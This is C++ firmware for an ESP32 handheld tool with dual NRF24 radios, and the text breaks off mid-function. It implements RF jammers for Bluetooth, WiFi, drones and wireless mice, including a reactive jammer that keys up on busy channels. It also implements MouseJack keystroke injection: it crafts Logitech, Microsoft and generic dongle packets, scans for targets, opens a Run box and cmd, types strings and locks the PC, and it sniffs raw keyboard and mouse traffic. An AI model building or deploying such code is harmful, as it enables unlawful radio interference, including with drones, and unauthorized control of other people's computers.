#ifndef MENU_NRF_H
#define MENU_NRF_H

#include "Config.h"
#include "DisplayBase.h"
#include <RF24.h>
#include <SPI.h>
#include "KeyboardData.h"

// RF-Clown Logic: Specific Channel List
// Optimized channel list for full spectrum coverage
// WiFi frequencies mapped to MHz offset (2412MHz = 12, etc.)
inline constexpr byte wifi_ch[] = {12, 17, 22, 27, 32, 37, 42, 47, 52, 57, 62, 67, 72}; 
// Full ISM Band (2.400 - 2.525 GHz) for Drones
inline constexpr int DRONE_CH_START = 0;
inline constexpr int DRONE_CH_END = 125;

// Wireless Mouse frequency range (2.400 - 2.483 GHz)
inline constexpr int MOUSE_CH_START = 0;
inline constexpr int MOUSE_CH_END = 83;

// Bluetooth uses 79 channels (2402-2480 MHz). 
// 1MHz spacing to cover all channels.
inline constexpr int BT_CH_START = 2;
inline constexpr int BT_CH_END = 80;

// MouseJack Payload List
inline constexpr const char* mjPayloads[] = {"1. Win+R (Run)", "2. Open CMD", "3. Hello World", "4. Lock PC", "5. Spam App A-Z"};
inline constexpr int MJ_PAYLOAD_COUNT = 5;

// Global variable for tracking Microsoft packet sequences
inline uint16_t msSequence = 0;

inline void initRadios(bool isJammer) {
    Serial.printf("\n[NRF] Initializing radios (Mode: %s)...\n", isJammer ? "JAMMER" : "PACKET");
    
    // Stop carrier if previously active
    radio.stopConstCarrier();
    radio2.stopConstCarrier();

    // Initialize SPI buses (begin() returns void, success verified by radio.begin() later)
    // VSPI: SCK=18, MISO=19, MOSI=23, CSN=17
    vspi.begin(NRF_SPI1_SCK, NRF_SPI1_MISO, NRF_SPI1_MOSI, NRF_RADIO1_CSN);
    hspi.begin(NRF_SPI2_SCK, NRF_SPI2_MISO, NRF_SPI2_MOSI, NRF_RADIO2_CSN);
    
    delay(100);

    // Initialize Radio 1 (VSPI)
    if (radio.begin(&vspi)) {
        AtomicUtils::safe_store(radio1_ok, true);
        Serial.println("[NRF] Radio 1 initialized successfully!");
        radio.setAutoAck(false);
        radio.stopListening();
        radio.setRetries(0, 0);
        radio.setDataRate(RF24_2MBPS);
        radio.setCRCLength(RF24_CRC_DISABLED);
        
        if (isJammer) {
            radio.setPALevel(RF24_PA_LOW, true); // Lower power for close-range testing
            radio.setChannel(NRF_CHANNEL_DEFAULT);
            radio.startConstCarrier(RF24_PA_MAX, NRF_CHANNEL_DEFAULT);
        } else {
            radio.setPALevel(RF24_PA_LOW, true); // LOW is more stable for short distance (< 3m)
        }
    } else {
        AtomicUtils::safe_store(radio1_ok, false);
        Serial.println("[NRF] ERROR: Radio 1 failed to initialize!");
    }
    
    delay(100);
    
    // Initialize Radio 2 (HSPI)
    if (radio2.begin(&hspi)) {
        AtomicUtils::safe_store(radio2_ok, true);
        Serial.println("[NRF] Radio 2 initialized successfully!");
        radio2.setAutoAck(false);
        radio2.stopListening();
        radio2.setRetries(0, 0);
        radio2.setDataRate(RF24_2MBPS);
        radio2.setCRCLength(RF24_CRC_DISABLED);

        if (isJammer) {
            radio2.setPALevel(RF24_PA_LOW, true);
            radio2.setChannel(NRF_CHANNEL_DEFAULT);
            radio2.startConstCarrier(RF24_PA_MAX, NRF_CHANNEL_DEFAULT);
        } else {
            radio2.setPALevel(RF24_PA_LOW, true);
        }
    } else {
        AtomicUtils::safe_store(radio2_ok, false);
        Serial.println("[NRF] WARNING: Radio 2 failed to initialize (OK if using 1 radio)");
    }
    
    Serial.printf("[NRF] Status - Radio1: %s, Radio2: %s\n", 
        AtomicUtils::safe_load(radio1_ok) ? "OK" : "FAIL", 
        AtomicUtils::safe_load(radio2_ok) ? "OK" : "FAIL");
    
    if (!AtomicUtils::safe_load(radio1_ok) && !AtomicUtils::safe_load(radio2_ok)) {
        Serial.println("[NRF] ERROR: Both radios failed! Check wiring.");
    }
}

inline void deinitRadios() {
    Serial.println("[NRF] Powering down radios...");
    if (AtomicUtils::safe_load(radio1_ok)) {
        radio.stopListening();
        radio.stopConstCarrier();
        radio.powerDown(); // Reduce power consumption to ~0.9 µA
    }
    if (AtomicUtils::safe_load(radio2_ok)) {
        radio2.stopListening();
        radio2.powerDown();
    }
}

inline void updateSpectrum() {
    // Use dual radios to scan the full spectrum faster
    for (int i = 0; i < 64; i++) {
        if (AtomicUtils::safe_load(radio1_ok)) {
            radio.setChannel(i);
            radio.startListening();
            delayMicroseconds(100);
            radio.stopListening();
            if (radio.testCarrier()) nrfSpectrum[i] = constrain(nrfSpectrum[i] + 2, 0, 30);
            else if (nrfSpectrum[i] > 0) nrfSpectrum[i]--;
        }
        
        if (AtomicUtils::safe_load(radio2_ok)) {
            int ch2 = i + 64;
            radio2.setChannel(ch2);
            radio2.startListening();
            delayMicroseconds(100);
            radio2.stopListening();
            if (radio2.testCarrier()) nrfSpectrum[ch2] = constrain(nrfSpectrum[ch2] + 2, 0, 30);
            else if (nrfSpectrum[ch2] > 0) nrfSpectrum[ch2]--;
        }
    }
}

inline void drawSpectrumAnalyzer() {
    u8g2.clearBuffer();
    u8g2.setFont(u8g2_font_4x6_tf);
    u8g2.drawStr(0, 6, "2.4GHz SPECTRUM ANALYZER");
    for (int i = 0; i < 128; i++) {
        u8g2.drawLine(i, 64, i, 64 - nrfSpectrum[i]);
    }
    u8g2.sendBuffer();
}

inline void btJam() {
    // More aggressive hopping to match Bluetooth frequency hopping
    for(int i = 0; i < 20; i++) {
        uint8_t ch1 = random(BT_CH_START, 41);
        uint8_t ch2 = random(41, BT_CH_END);

        if (AtomicUtils::safe_load(radio1_ok) && AtomicUtils::safe_load(radio2_ok)) {
            // Force restart carrier for external PA/LNA modules to sync frequency
            radio.stopConstCarrier();
            radio2.stopConstCarrier();
            radio.setChannel(ch1);
            radio2.setChannel(ch2);
            radio.startConstCarrier(RF24_PA_MAX, ch1);
            radio2.startConstCarrier(RF24_PA_MAX, ch2);
        } else if (AtomicUtils::safe_load(radio1_ok)) {
            radio.stopConstCarrier();
            radio.setChannel(random(BT_CH_START, BT_CH_END));
            radio.startConstCarrier(RF24_PA_MAX, radio.getChannel());
        } else if (AtomicUtils::safe_load(radio2_ok)) {
            radio2.stopConstCarrier();
            radio2.setChannel(random(BT_CH_START, BT_CH_END));
            radio2.startConstCarrier(RF24_PA_MAX, radio2.getChannel());
        }
        
        // Allow PLL settling time for slower external modules
        delayMicroseconds(60); // Aggressive: exploit transitional noise (splatter)
    }
}

inline void droneJam() {
    for(int i = 0; i < 20; i++) {
        uint8_t ch1 = random(DRONE_CH_START, 63);
        uint8_t ch2 = random(63, DRONE_CH_END + 1);

        if (AtomicUtils::safe_load(radio1_ok) && AtomicUtils::safe_load(radio2_ok)) {
            radio.stopConstCarrier();
            radio2.stopConstCarrier();
            radio.setChannel(ch1);
            radio2.setChannel(ch2);
            radio.startConstCarrier(RF24_PA_MAX, ch1);
            radio2.startConstCarrier(RF24_PA_MAX, ch2);
        } else if (AtomicUtils::safe_load(radio1_ok)) {
            radio.stopConstCarrier();
            radio.setChannel(random(DRONE_CH_START, DRONE_CH_END + 1));
            radio.startConstCarrier(RF24_PA_MAX, radio.getChannel());
        } else if (AtomicUtils::safe_load(radio2_ok)) {
            radio2.stopConstCarrier();
            radio2.setChannel(random(DRONE_CH_START, DRONE_CH_END + 1));
            radio2.startConstCarrier(RF24_PA_MAX, radio2.getChannel());
        }
        delayMicroseconds(70);
    }
}

inline void mouseJam() {
    // Jam wireless mice by sweeping entire 2.4G ISM spectrum randomly
    for(int i = 0; i < 40; i++) {
        if (AtomicUtils::safe_load(radio1_ok) && AtomicUtils::safe_load(radio2_ok)) {
            radio.stopConstCarrier();
            radio2.stopConstCarrier();
            radio.setChannel(random(MOUSE_CH_START, 42));
            radio2.setChannel(random(42, MOUSE_CH_END + 1));
            radio.startConstCarrier(RF24_PA_MAX, radio.getChannel());
            radio2.startConstCarrier(RF24_PA_MAX, radio2.getChannel());
        } else if (AtomicUtils::safe_load(radio1_ok)) {
            radio.stopConstCarrier();
            radio.setChannel(random(MOUSE_CH_START, MOUSE_CH_END + 1));
            radio.startConstCarrier(RF24_PA_MAX, radio.getChannel());
        } else if (AtomicUtils::safe_load(radio2_ok)) {
            radio2.stopConstCarrier();
            radio2.setChannel(random(MOUSE_CH_START, MOUSE_CH_END + 1));
            radio2.startConstCarrier(RF24_PA_MAX, radio2.getChannel());
        }
        delayMicroseconds(70);
    }
}

inline void wifiJam(bool targeted = false) {
    byte target1, target2;
    
    if (targeted) {
        int ch = AtomicUtils::safe_load(targetChannel);
        if (ch < 1 || ch > 13) ch = 1;
        target1 = wifi_ch[ch - 1];
        target2 = target1; // Both radios focus on jamming the same channel
    } else {
        target1 = wifi_ch[random(0, 13)];
        target2 = wifi_ch[random(0, 13)];
    }

    // Sweep +/- 12MHz to ensure the full 20-22MHz bandwidth is covered
    for(int i = -15; i <= 15; i++) { // Sharper focus on WiFi bandwidth
        if (AtomicUtils::safe_load(radio1_ok)) {
            int ch1 = (int)target1 + i;
            if (ch1 >= 0 && ch1 <= 125) {
                radio.stopConstCarrier();
                radio.setChannel((byte)ch1);
                radio.startConstCarrier(RF24_PA_MAX, (byte)ch1);
            }
        }
        
        if (AtomicUtils::safe_load(radio2_ok)) {
            int ch2 = (int)target2 + i;
            if (ch2 >= 0 && ch2 <= 125) {
                radio2.stopConstCarrier();
                radio2.setChannel((byte)ch2);
                radio2.startConstCarrier(RF24_PA_MAX, (byte)ch2);
            }
        }
        
        delayMicroseconds(100); // More effective sweep timing
        if (i % 12 == 0) yield();
    }
}

inline void reactiveJam() {
    // Scan spectrum for active signals (Reactive Jamming)
    for (int i = 0; i < 125; i++) {
        bool signalDetected = false;
        
        if (AtomicUtils::safe_load(radio1_ok)) {
            radio.setChannel(i);
            radio.startListening();
            delayMicroseconds(50);
            if (radio.testCarrier()) signalDetected = true;
            radio.stopListening();
            
            if (signalDetected) {
                // Jam active channel for 2ms
                radio.startConstCarrier(RF24_PA_MAX, i);
                delay(2); 
                radio.stopConstCarrier();
            }
        }
        // Yield CPU every 10 channels
        if (i % 10 == 0) yield();
    }
}

inline void singleChannel() {
    // RF-Clown Logic: Mix of all problematic frequencies
    for(int i = 0; i < 10; i++) {
        if (AtomicUtils::safe_load(radio1_ok) && AtomicUtils::safe_load(radio2_ok)) {
            // Radio 1 focuses on BT, Radio 2 on WiFi/Drone
            radio.setChannel(random(BT_CH_START, BT_CH_END));
            if (random(0, 2) == 0) {
                radio2.setChannel(wifi_ch[random(0, sizeof(wifi_ch) / sizeof(wifi_ch[0]))]);
            } else {
                radio2.setChannel(random(DRONE_CH_START, DRONE_CH_END + 1));
            }
        } else {
            int r = random(0, 3);
            byte ch;
            if (r == 0) ch = random(BT_CH_START, BT_CH_END);
            else if (r == 1) ch = wifi_ch[random(0, sizeof(wifi_ch) / sizeof(wifi_ch[0]))];
            else ch = random(DRONE_CH_START, DRONE_CH_END + 1);
            
            if (AtomicUtils::safe_load(radio1_ok)) radio.setChannel(ch);
            if (AtomicUtils::safe_load(radio2_ok)) radio2.setChannel(ch);
        }
        delayMicroseconds(130);
    }
}

inline void injectKeystroke(uint8_t modifier, uint8_t key, int type, uint8_t* targetAddr) {
    uint8_t pkt[32];
    memset(pkt, 0, sizeof(pkt));
    int len = 0;

    switch(type) {
        case 0: { // Logitech Unifying (Standard 10-byte format)
            pkt[0] = 0x00;
            pkt[1] = 0xC1; 
            pkt[2] = modifier;
            pkt[3] = key;
            // Log_checksum: 0xFF - sum + 1
            uint8_t cksum = 0xFF;
            for (int n = 0; n < 9; n++) cksum -= pkt[n];
            pkt[9] = cksum + 1;
            len = 10;
            break;
        }
        case 1: { // Microsoft Encrypted (19-byte format)
            len = 19;
            pkt[0] = 0x0A; // Report ID for encrypted keyboard
            pkt[4] = msSequence & 0xFF;
            pkt[5] = (msSequence >> 8) & 0xFF;
            pkt[6] = 0x43; // Constant
            pkt[7] = modifier;
            pkt[9] = key;
            
            // Microsoft Checksum
            uint8_t cksum = 0;
            for (int i = 0; i < 18; i++) cksum ^= pkt[i];
            pkt[18] = ~cksum;

            // Microsoft XOR Encryption (Bytes 4-18)
            for (int i = 4; i < 19; i++) {
                pkt[i] ^= targetAddr[(i - 4) % 5];
            }
            msSequence++;
            break;
        }
        case 2: // Common Generic 2.4G (8-byte format)
            pkt[0] = 0x01; // Using Report ID 0x01 (standard for generic keyboards)
            pkt[1] = modifier;
            pkt[2] = 0x00; // Reserved
            pkt[3] = key;  // Keycode 1
            len = 8;
            break;
    }

    if (len == 0) return;

    if (radio1_ok) {
        radio.stopListening();

        // Radio configuration
        radio.setPALevel(RF24_PA_LOW); 
        radio.setDataRate(RF24_2MBPS);
        radio.setAutoAck(false); // Disable ACK as many generic dongles do not respond to ACK
        radio.setRetries(0, 0);
        radio.openWritingPipe(targetAddr);

        // Burst: Send same packet 5 times to ensure reception by generic dongles
        for(int i = 0; i < 5; i++) {
            radio.write(pkt, len);
            delayMicroseconds(200);
        }
        
        delay(35); // Longer delay to allow dongle time to process input
        uint8_t nullPkt[32];
        memset(nullPkt, 0, 32);
        nullPkt[0] = pkt[0];
        if (type == 1) { 
            nullPkt[4] = msSequence & 0xFF;
            nullPkt[5] = (msSequence >> 8) & 0xFF;
            nullPkt[6] = 0x43;
            uint8_t nCksum = 0;
            for(int j=0; j<18; j++) nCksum ^= nullPkt[j];
            nullPkt[18] = ~nCksum;
            for(int j=4; j<19; j++) nullPkt[j] ^= targetAddr[(j-4)%5];
            msSequence++;
        } else if (type == 0) {
            nullPkt[1] = 0xC1;
            uint8_t nCksum = 0xFF;
            for(int j=0; j<9; j++) nCksum -= nullPkt[j];
            nullPkt[9] = nCksum + 1;
        }

        // Release Key Burst
        for(int i = 0; i < 5; i++) {
            radio.write(nullPkt, len);
            delayMicroseconds(200);
        }
    }
}

inline void universalInject(uint8_t modifier, uint8_t key) {
    int count = AtomicUtils::safe_load(mjTargetCount);
    for(int i = 0; i < count; i++) {
        // Try all attack types on discovered targets
        for(int type = 0; type < 3; type++) {
            injectKeystroke(modifier, key, type, mjTargetAddresses[i]);
            delay(2);
        }
    }
}

inline void typeString(String text) {
    for (int i = 0; i < text.length(); i++) {
        HIDKey k = asciiToHID(text[i]);
        if (k.usage != 0x00) {
            universalInject(k.modifier, k.usage);
            delay(50); // Generic dongles need longer inter-character delay
        }
        yield();
    }
}

inline void updateMouseJack() {
    static unsigned long lastUpdate = 0;
    if (millis() - lastUpdate < 30) return;
    lastUpdate = millis();

    xSemaphoreTake(stringMutex, portMAX_DELAY);
    if (!AtomicUtils::safe_load(mouseJackActive)) {
        if (mjStatus != "Scanning...") mjStatus = "Scanning...";
        xSemaphoreGive(stringMutex);
        return;
    }

    String currentStatus = mjStatus;
    xSemaphoreGive(stringMutex);

    // Keep scanning while not injecting and target list is not full (for Multi-Spam)
    if (currentStatus != "Injecting..." && AtomicUtils::safe_load(mjTargetCount) < MAX_MJ_TARGETS) {
        mjChannel++;
        if (mjChannel > 85) mjChannel = 2; // Focus on common wireless mouse frequencies
        
        if (AtomicUtils::safe_load(radio1_ok)) {
            radio.stopListening();
            radio.setChannel(mjChannel);
            
            // Cycle through common prefixes (Logitech, etc.)
            static uint8_t prefixes[] = {0xC5, 0xA4, 0xBB, 0x33, 0x00};
            static int prefIdx = 0;
            uint8_t searchAddr[] = {prefixes[prefIdx], 0x55, 0x55, 0x55, 0x55};
            prefIdx = (prefIdx + 1) % 5;

            radio.setAddressWidth(5);
            radio.openReadingPipe(1, searchAddr);
            radio.startListening();
            
            delay(2); // Wait for incoming packet
            
            if (radio.available()) {
                uint8_t buffer[32];
                radio.read(buffer, 32);
                
                int count = AtomicUtils::safe_load(mjTargetCount);
                if (count < MAX_MJ_TARGETS) {
                    // Check duplicates to avoid spamming the same address repeatedly
                    bool exists = false;
                    for(int i=0; i<count; i++) {
                        if(memcmp(mjTargetAddresses[i], searchAddr, 5) == 0) { exists = true; break; }
                    }
                    
                    if (!exists) {
                        memcpy(mjTargetAddresses[count], searchAddr, 5);
                        mjTargetChannels[count] = mjChannel;
                        AtomicUtils::safe_store(mjTargetCount, count + 1);

                        xSemaphoreTake(stringMutex, portMAX_DELAY);
                        mjStatus = "Targets: " + String(count + 1);
                        xSemaphoreGive(stringMutex);
                        Serial.printf("[MJ] Target #%d added on Ch %d\n", count + 1, mjChannel);
                    }
                }
            }
        }
    } 
    // Automated logic disabled so user can select payload via UI
}

inline void updateNRFListen(bool isKeyboard) {
    static unsigned long lastUpdate = 0;
    if (millis() - lastUpdate < 10) return;
    lastUpdate = millis();

    int count = AtomicUtils::safe_load(mjTargetCount);

    // Phase 1: Scanning (if no targets found yet)
    if (count == 0) {
        mjChannel++;
        if (mjChannel > 85) mjChannel = 2;
        
        if (AtomicUtils::safe_load(radio1_ok)) {
            radio.stopListening();
            radio.setChannel(mjChannel);
            
            // Common prefixes: Logitech (0xC5, 0xBB), Microsoft (0xCD), Generic (0x33, 0xA4)
            static uint8_t prefixes[] = {0xC5, 0xA4, 0xBB, 0x33, 0xCD};
            static int prefIdx = 0;
            uint8_t searchAddr[] = {prefixes[prefIdx], 0x55, 0x55, 0x55, 0x55};
            prefIdx = (prefIdx + 1) % 5;

            radio.setAddressWidth(5);
            radio.openReadingPipe(1, searchAddr);
            radio.startListening();
            
            delay(4); // Longer window (4ms) to capture active packets
            
            if (radio.available()) {
                AtomicUtils::safe_store(mjTargetCount, 1);
                memcpy(mjTargetAddresses[0], searchAddr, 5);
                
                xSemaphoreTake(stringMutex, portMAX_DELAY);
                mjStatus = "Listening...";
                xSemaphoreGive(stringMutex);
                
                Serial.printf("\n[NRF_LISTEN] Found %s on Ch %d! Addr: %02X:%02X:%02X:%02X:%02X\n", 
                    isKeyboard ? "Keyboard" : "Mouse", mjChannel, searchAddr[0], searchAddr[1], searchAddr[2], searchAddr[3], searchAddr[4]);
            }
        }
    } 
    // Phase 2: Listening (once target is acquired)
    else {
        if (AtomicUtils::safe_load(radio1_ok) && radio.available()) {
            uint8_t len = radio.getPayloadSize();
            if (len > 32) len = 32;
            uint8_t packet[32];
            radio.read(packet, len);
            
            xSemaphoreTake(stringMutex, portMAX_DELAY);
            Serial.printf("[%s][Ch:%d][Addr:%02X:%02X:%02X:%02X:%02X] Payload: ", 
                isKeyboard ? "KEYBOARD" : "MOUSE", 
                mjChannel, 
                mjTargetAddresses[0][0], mjTargetAddresses[0][1], 
                mjTargetAddresses[0][2], mjTargetAddresses[0][3], 
                mjTargetAddresses[0][4]);
            for(int i=0; i<len; i++) Serial.printf("%02X", packet[i]);
            xSemaphoreGive(stringMutex);
            Serial.println();
        }
    }
}

inline void drawNRFListenUI(const char* title) {
    u8g2.clearBuffer(); drawStatusBar();
    u8g2.setDrawColor(1); u8g2.drawBox(0, 16, 128, HEADER_H); u8g2.setDrawColor(0); 
    u8g2.setFont(u8g2_font_6x10_tf); u8g2.drawStr(20, HEADER_Y, title);
    
    xSemaphoreTake(stringMutex, portMAX_DELAY);
    String currentStatus = mjStatus;
    xSemaphoreGive(stringMutex);
    
    int count = AtomicUtils::safe_load(mjTargetCount);
    u8g2.setDrawColor(1); u8g2.setFont(u8g2_font_5x7_tf);
    u8g2.setCursor(10, 35); u8g2.print("Status: "); u8g2.print(currentStatus);
    u8g2.setCursor(10, 44); u8g2.print("Channel: "); u8g2.print(mjChannel);
    
    if (count == 0) {
        int anim = (millis() / 400) % 4;
        String d = ""; for(int i=0; i<anim; i++) d += ".";
        u8g2.drawStr(85, 35, d.c_str());
        u8g2.drawStr(10, 55, "Scanning devices...");
    } else {
        u8g2.setCursor(10, 52); u8g2.print("Addr: ");
        for(int i=0; i<3; i++) { u8g2.print(mjTargetAddresses[0][i], HEX); if(i<2) u8g2.print(":"); }
        u8g2.drawStr(10, 62, "SEL: RESCAN | NEXT: BACK");
    }
    
    u8g2.sendBuffer();
}

// Helper function to execute selected payload (called from handleSelect in .ino)
inline void executeSelectedPayload() {
    int count = AtomicUtils::safe_load(mjTargetCount);
    if (count == 0 || !AtomicUtils::safe_load(radio1_ok)) return;

    xSemaphoreTake(stringMutex, portMAX_DELAY);
    mjStatus = "Injecting...";
    xSemaphoreGive(stringMutex);
    
    Serial.printf("[MJ] Executing Payload %d: %s\n", mjPayloadCursor, mjPayloads[mjPayloadCursor]);

    switch(mjPayloadCursor) {
        case 0: // Win+R
            universalInject(MOD_LGUI, 0x15); delay(100); yield(); break; // Extra delay after Win+R
        case 1: // Open CMD & Type
            universalInject(MOD_LGUI, 0x15); delay(400); 
            typeString("cmd\n"); 
            delay(600);
            typeString("echo Hello from ESP32 NavSmart!\n");
            break;
        case 2: // Hello World (Direct Type)
            typeString("Hello World!"); 
            break;
        case 3: // Lock PC (Win+L)
            universalInject(MOD_LGUI, 0x0F); delay(100); yield(); break; // GUI + l
        case 4: // Spam App A-Z (Looping)
            static uint8_t mjCurrentChar = 0x04;
            universalInject(MOD_LGUI, 0x00); delay(100); yield();
            universalInject(MOD_NONE, mjCurrentChar); delay(100); yield();
            universalInject(MOD_NONE, 0x28); delay(100);
            mjCurrentChar++;
            if (mjCurrentChar > 0x1D) mjCurrentChar = 0x04;
            break;
    }
    
    delay(600); // Allow delay so user can see "Injecting..." status
    
    xSemaphoreTake(stringMutex, portMAX_DELAY);
    // Refresh count in case targets were added just before injection
    mjStatus = "Targets: " + String(AtomicUtils::safe_load(mjTargetCount)); 
    xSemaphoreGive(stringMutex);
}

inline void drawMouseJackRun() {
    u8g2.clearBuffer(); drawStatusBar();
    u8g2.setDrawColor(1); u8g2.drawBox(0, 16, 128, HEADER_H); u8g2.setDrawColor(0); 
    u8g2.setFont(u8g2_font_6x10_tf); u8g2.drawStr(32, HEADER_Y, "MOUSE JACK");
    
    xSemaphoreTake(stringMutex, portMAX_DELAY);
    String currentStatus = mjStatus;
    xSemaphoreGive(stringMutex);
    
    int count = AtomicUtils::safe_load(mjTargetCount);
    if (mjPayloadCursor >= MJ_PAYLOAD_COUNT) mjPayloadCursor = 0;

    u8g2.setDrawColor(1); u8g2.setFont(u8g2_font_5x7_tf);
    u8g2.setCursor(10, 35); u8g2.print("Status: "); u8g2.print(currentStatus);
    u8g2.setCursor(10, 44); u8g2.print("Channel: "); u8g2.print(mjChannel);
    
    if (currentStatus == "Scanning..." || count == 0) {
        int anim = (millis() / 400) % 4;
        String d = ""; for(int i=0; i<anim; i++) d += ".";
        u8g2.drawStr(85, 44, d.c_str());
        
        u8g2.drawStr(10, 55, "Searching Target...");
        u8g2.setFont(u8g2_font_4x6_tf); u8g2.drawStr(10, 62, "SEL: BACK");
    } else if (count > 0) {
        u8g2.setFont(u8g2_font_4x6_tf); u8g2.setDrawColor(1);
        u8g2.setCursor(10, 30); u8g2.print("Target Found: "); u8g2.print(count);

        if (currentStatus == "Injecting...") {
            u8g2.setFont(u8g2_font_5x7_tf);
            u8g2.drawStr(10, 45, "INJECTING PAYLOAD...");
            u8g2.drawStr(10, 55, mjPayloads[mjPayloadCursor]);
        } else {
            // Display selectable attack menu scrollable with NEXT button
            for (int i = 0; i < 3; i++) {
                int idx = (mjPayloadCursor + i) % MJ_PAYLOAD_COUNT;
                int y = 41 + (i * 8);
                if (i == 0) { u8g2.setDrawColor(1); u8g2.drawBox(4, y-7, 120, 9); u8g2.setDrawColor(0); }
                else u8g2.setDrawColor(1);
                u8g2.setCursor(10, y); u8g2.print(mjPayloads[idx]);
            }
            u8g2.setDrawColor(1);
            u8g2.setFont(u8g2_font_4x6_tf); 
            u8g2.drawStr(5, 63, "NEXT:CHANGE | SEL:SEND | HOLD:EXIT");
        }
    }
    
    u8g2.sendBuffer();
}

inline void drawNRFMenu() {
    u8g2.clearBuffer(); drawStatusBar();
    u8g2.setDrawColor(1); u8g2.drawBox(0, 16, 128, HEADER_H); u8g2.setDrawColor(0); 
    u8g2.setFont(u8g2_font_6x10_tf); u8g2.drawStr(25, HEADER_Y, "NRF24 JAMMER");
    
    u8g2.setFont(u8g2_font_4x6_tf);
    // Show available radios
    String radioStatus = "R1:";
    radioStatus += AtomicUtils::safe_load(radio1_ok) ? "OK " : "- ";
    radioStatus += "R2:";
    radioStatus += AtomicUtils::safe_load(radio2_ok) ? "OK" : "-";
    u8g2.drawStr(10, 27, radioStatus.c_str());
    
    // Show jamming strategy
    int activeRadios = (AtomicUtils::safe_load(radio1_ok) ? 1 : 0) + (AtomicUtils::safe_load(radio2_ok) ? 1 : 0);
    u8g2.drawStr(80, 27, activeRadios == 2 ? "DUAL" : "SINGLE");
    
    const char* nrfItems[] = {"1. BT Jammer", "2. Drone Jammer", "3. Wifi Jammer", "4. Multi Ch Jam", "5. Mouse Jammer", "6. Target Jam", "7. Listen Mouse", "8. Listen Kbd", "9. Back"};
    int nrfItemCount = 9;
    // Scrolling logic: display 4 items, keep cursor centered or fit bounds
    int start = constrain(nrfCursor - 1, 0, max(0, nrfItemCount - 4));
    for (int i = 0; i < 4; i++) {
        int idx = start + i;
        if (idx >= nrfItemCount) break;
        int y = 39 + (i * 8);
        if (idx == nrfCursor) { u8g2.setDrawColor(1); u8g2.drawBox(4, y-7, 115, 9); u8g2.setDrawColor(0); } else u8g2.setDrawColor(1);
        u8g2.setFont(u8g2_font_5x7_tf);
        
        if (idx == 5) { // Target Jam index
            char buf[30];
            snprintf(buf, sizeof(buf), "6. Target Jam [Ch:%d]", AtomicUtils::safe_load(targetChannel));
            u8g2.drawStr(10, y, buf);
        } else {
            u8g2.drawStr(10, y, nrfItems[idx]);
        }
    }
    u8g2.sendBuffer();
}

inline void drawNRFTargetScan() {
    u8g2.clearBuffer(); drawStatusBar();
    u8g2.setDrawColor(1); u8g2.drawBox(0, 16, 128, HEADER_H); u8g2.setDrawColor(0); 
    u8g2.setFont(u8g2_font_6x10_tf); u8g2.drawStr(25, HEADER_Y, "NRF SCANNING");
    u8g2.setDrawColor(1); u8g2.setFont(u8g2_font_5x7_tf);
    
    u8g2.setCursor(10, 40); u8g2.print("Found: "); u8g2.print(AtomicUtils::safe_load(mjTargetCount));
    u8g2.setCursor(10, 50); u8g2.print("Channel: "); u8g2.print(mjChannel);
    
    int anim = (millis() / 400) % 4;
    for(int i=0; i<anim; i++) u8g2.drawStr(90 + (i*4), 40, ".");
    
    u8g2.setFont(u8g2_font_4x6_tf);
    u8g2.drawStr(10, 62, "SELECT: STOP & SELECT");
    u8g2.sendBuffer();
}

inline void drawNRFTargetSelect() {
    u8g2.clearBuffer(); drawStatusBar();
    u8g2.setDrawColor(1); u8g2.drawBox(0, 16, 128, HEADER_H); u8g2.setDrawColor(0); 
    u8g2.setFont(u8g2_font_6x10_tf); u8g2.drawStr(25, HEADER_Y, "SELECT TARGET");
    u8g2.setDrawColor(1); u8g2.setFont(u8g2_font_5x7_tf);

    int count = AtomicUtils::safe_load(mjTargetCount);
    int start = constrain(nrfTargetCursor - 1, 0, max(0, count - 3));
    for (int i = 0; i < 3; i++) {
        int idx = start + i; if (idx >= count) break;
        int y = 39 + (i * 9);
        if (idx == nrfTargetCursor) { u8g2.setDrawColor(1); u8g2.drawBox(4, y-7, 120, 9); u8g2.setDrawColor(0); } else u8g2.setDrawColor(1);
        char addrStr[20];
        snprintf(addrStr, sizeof(addrStr), "%02X:%02X:%02X [Ch:%d]", mjTargetAddresses[idx][0], mjTargetAddresses[idx][1], mjTargetAddresses[idx][2], mjTargetChannels[idx]);
        u8g2.drawStr(10, y, addrStr);
    }
    u8g2.sendBuffer();
}

inline void drawNRFRun() {
    u8g2.clearBuffer(); drawStatusBar();
    u8g2.setDrawColor(1); u8g2.drawBox(0, 16, 128, HEADER_H); u8g2.setDrawColor(0); u8g2.setFont(u8g2_font_6x10_tf); u8g2.drawStr(30, HEADER_Y, "NRF ACTIVE");
    u8g2.setDrawColor(1); u8g2.setFont(u8g2_font_5x7_tf);
    
    const char* modes[] = {"BT Jammer", "Drone Jammer", "WiFi Sweep", "Multi Ch Jam", "Mouse Jam", "Target Jam"}; // Corrected mode names
    
    int currentMode = AtomicUtils::safe_load(nrfJamMode);
    u8g2.drawStr(10, 35, (currentMode < 6) ? modes[currentMode] : "Unknown");
    
    if (currentMode == 5) { // If Target Jam
        u8g2.printf(" (Ch:%d)", AtomicUtils::safe_load(targetChannel));
    }
    
    // Show radio status
    u8g2.drawStr(10, 43, "R1:");
    u8g2.drawStr(30, 43, AtomicUtils::safe_load(radio1_ok) ? "OK" : "FAIL");
    u8g2.drawStr(60, 43, "R2:");
    u8g2.drawStr(80, 43, AtomicUtils::safe_load(radio2_ok) ? "OK" : "FAIL");
    
    // Show jamming indicator
    int phase = (millis() / 200) % 6; 
    String dots = "";
    for(int i=0; i<phase; i++) dots += "*";  // Asterisks show activity
    u8g2.drawStr(10, 53, "JAMMING:");
    u8g2.drawStr(70, 53, dots.c_str());
    
    u8g2.setFont(u8g2_font_4x6_tf); 
    u8g2.drawStr(10, 62, "NEXT/SEL = STOP & BACK");
    u8g2.sendBuffer();
}

inline void printNRFStatus() {
    Serial.println("\n[NRF_STATUS] ====================");
    Serial.printf("Radio 1 (VSPI): %s\n", AtomicUtils::safe_load(radio1_ok) ? "✓ OPERATIONAL" : "✗ NOT DETECTED");
    Serial.printf("  - CE Pin: 5, CSN Pin: 17\n");
    Serial.printf("  - SPI: Clock=18, MISO=19, MOSI=23\n");
    
    Serial.printf("Radio 2 (HSPI): %s\n", AtomicUtils::safe_load(radio2_ok) ? "✓ OPERATIONAL" : "✗ NOT DETECTED");
    Serial.printf("  - CE Pin: 16, CSN Pin: 27\n");
    Serial.printf("  - SPI: Clock=14, MISO=12, MOSI=13\n");
    
    int activeRadios = (AtomicUtils::safe_load(radio1_ok) ? 1 : 0) + (AtomicUtils::safe_load(radio2_ok) ? 1 : 0);
    Serial.printf("\n[NRF_STRATEGY] Active Radios: %d\n", activeRadios);
    
    if (activeRadios == 2) {
